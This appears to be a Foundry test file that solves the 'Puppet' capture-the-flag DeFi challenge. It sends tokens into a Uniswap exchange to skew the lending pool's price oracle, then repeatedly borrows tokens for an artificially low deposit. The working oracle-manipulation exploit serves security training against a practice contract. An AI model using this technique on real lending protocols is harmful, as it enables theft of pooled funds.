// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../../src/puppet/PuppetLevel.sol";
import "@openzeppelin/contracts//token/ERC20/IERC20.sol";

interface IPuppetPool {
  function borrow(uint256, address) external payable;
  function calculateDepositRequired(uint256) external view returns (uint256);
}

contract PuppetTest is Test {
  PuppetLevel level = new PuppetLevel();

  function setUp() public {
    level.setup();
  }

  function testExploit() public {
    IPuppetPool lendingPool = IPuppetPool(address(level.lendingPool()));

    IERC20 token = IERC20(address(level.token()));
    token.transfer(address(level.uniswapExchange()), 1_000e18);

    uint256 step = 10e18;

    for (uint8 i = 0; i < 1000; i++) {
      console.log(lendingPool.calculateDepositRequired(step));

      lendingPool.borrow
        {value: lendingPool.calculateDepositRequired(step)}
          (step, address(this));
    }

    level.validate();
  }

  receive() external payable {}
}
